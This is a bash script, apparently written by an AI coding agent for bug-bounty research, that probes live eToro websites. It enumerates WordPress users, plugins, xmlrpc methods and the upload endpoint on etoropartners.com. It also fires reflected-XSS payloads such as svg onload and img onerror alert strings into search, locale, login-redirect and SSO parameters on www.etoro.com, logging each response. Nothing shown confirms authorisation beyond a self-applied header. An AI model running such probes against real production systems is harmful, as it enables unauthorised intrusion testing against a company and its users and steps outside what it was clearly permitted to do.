#!/usr/bin/env bash
# eToro composer-xss probe — max ~35 requests, X-Bug-Bounty header
set -euo pipefail
HDR=(-H "X-Bug-Bounty: cursor-cloud-agent" -H "User-Agent: Mozilla/5.0 (compatible; BugBounty/1.0)")
OUTDIR="/workspace/research/etoro/composer-xss/raw"
LOG="$OUTDIR/log.txt"
COUNT_FILE="$OUTDIR/req_count.txt"
: > "$LOG"
echo "0" > "$COUNT_FILE"

req() {
  local id="$1" url="$2"
  local extra=("${@:3}")
  local n
  n=$(cat "$COUNT_FILE")
  n=$((n + 1))
  echo "$n" > "$COUNT_FILE"
  echo "=== REQ#$n $id ===" >> "$LOG"
  echo "URL: $url" >> "$LOG"
  local body hdr
  body=$(mktemp)
  hdr=$(mktemp)
  local code final
  code=$(curl -sS -L -D "$hdr" -o "$body" -w "%{http_code}" --max-time 25 "${HDR[@]}" "${extra[@]}" "$url" 2>>"$LOG" || echo "000")
  final=$(grep -i "^location:" "$hdr" 2>/dev/null | tail -1 || true)
  local size
  size=$(wc -c < "$body" | tr -d ' ')
  {
    echo "http_code=$code size=$size"
    echo "--- headers (selected) ---"
    grep -iE '^(HTTP/|content-type:|location:|x-frame|content-security|set-cookie: __cf|server:)' "$hdr" 2>/dev/null | head -20 || true
    echo "BODY_SNIP:"
    head -c 1200 "$body" | tr '\0' ' '
    echo
  } >> "$LOG"
  cp "$body" "$OUTDIR/${n}_${id}.body" 2>/dev/null || true
  cp "$hdr" "$OUTDIR/${n}_${id}.headers" 2>/dev/null || true
  rm -f "$body" "$hdr"
  echo "REQ#$n $id code=$code"
}

# --- etoropartners.com WP (6 reqs) ---
req partners_wpjson "https://etoropartners.com/wp-json/"
req partners_users "https://etoropartners.com/wp-json/wp/v2/users"
req partners_plugins "https://etoropartners.com/wp-json/wp/v2/plugins"
req partners_types "https://etoropartners.com/wp-json/wp/v2/types"
req partners_xmlrpc "https://etoropartners.com/xmlrpc.php" -X POST -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>'
req partners_upload "https://etoropartners.com/wp-admin/async-upload.php"

# --- delta.app / etorox (4 reqs) ---
req delta_root "https://delta.app/"
req delta_etoro "https://delta.app/etoro" 
req etorox_root "https://www.etorox.com/"
req etorox_api "https://api.etorox.com/"

# --- www.etoro.com reflection tests (careful, 1-2 per param) ---
MARKER='bbxss9cursor'
req etoro_search "https://www.etoro.com/search/?q=${MARKER}%22%3E%3Csvg%2Fonload%3Dalert(1)%3E"
req etoro_referral "https://www.etoro.com/referral/?ref=${MARKER}"
req etoro_locale "https://www.etoro.com/?locale=${MARKER}%3Cscript%3E"
req etoro_redirect "https://www.etoro.com/login/?redirect=${MARKER}"
req etoro_next "https://www.etoro.com/sso/?next=${MARKER}%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E"

# --- interesting public endpoints from prior recon ---
req logininfo "https://www.etoro.com/api/logininfo/v1.1/users/${MARKER}"
req markets_search "https://www.etoro.com/markets/?search=${MARKER}"
req discover_q "https://www.etoro.com/discover/people?q=${MARKER}"

# --- partners subdomain variants ---
req partners_rest "https://www.etoropartners.com/wp-json/"
req partners_media "https://etoropartners.com/wp-json/wp/v2/media?per_page=1"

echo "TOTAL=$(cat "$COUNT_FILE")" >> "$LOG"
echo "DONE total=$(cat "$COUNT_FILE")"
